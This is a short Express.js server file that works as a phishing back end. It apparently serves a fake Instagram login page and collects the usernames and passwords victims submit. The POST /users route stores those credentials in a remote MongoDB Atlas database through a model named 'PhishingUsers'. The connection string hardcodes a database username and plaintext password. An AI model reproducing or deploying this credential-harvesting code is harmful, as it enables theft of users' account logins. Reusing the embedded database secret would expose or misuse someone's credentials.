const express = require("express");
const path = require("path");
const expressEdge = require("express-edge");
const mongoose = require("mongoose");
const PhishingUsers = require("./models/PhishingUsers")
const app = express();
const ip = require("ip")
app.use(express.static("public"));
app.use(expressEdge.engine);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


const PORT = 5000
app.set("views", `${__dirname}/views`);

mongoose.connect(
  "mongodb+srv://sherozbek_17:Matematika3sinf@cluster0.smsvtvg.mongodb.net/instagram",
  () => {
    console.log("Connect DATABASE Mongo");
  }
);
app.get("/", (req, res) => {
  console.log(ip.address());
  res.render("index");
});

app.get("/okey" , (req, res) => {
  res.send("HACKING")
})


app.post("/users", (req, res) => {
  console.log(req.body);
  const {username , password} = req.body;

  PhishingUsers.create(req.body , ( err , post) => {
    console.log(err , post);
    res.redirect("/");
  })
});

app.listen(PORT, () => console.log("Server has been started on PORT 5000..."));
